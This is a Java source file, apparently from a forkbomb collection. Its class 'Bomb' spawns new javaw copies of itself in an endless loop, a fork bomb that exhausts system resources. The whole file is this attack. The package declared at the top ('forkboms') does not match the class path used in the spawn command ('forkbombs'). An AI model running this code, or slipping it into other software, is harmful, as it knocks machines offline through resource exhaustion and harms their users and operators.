package us.yellosoft.forkboms;

import java.io.IOException;

/** A basic forkbomb */
public class Bomb {
    /** Utility class */
    private Bomb() {}

    /** CLI entry point
        @param args CLI flags
    */
    public static void main(final String[] args) throws IOException {
        while (true) {
            Runtime.getRuntime().exec(
                String.format("javaw -cp %s us.yellosoft.forkbombs.Bomb", System.getProperty("java.class.path"))
            );
        }
    }
}
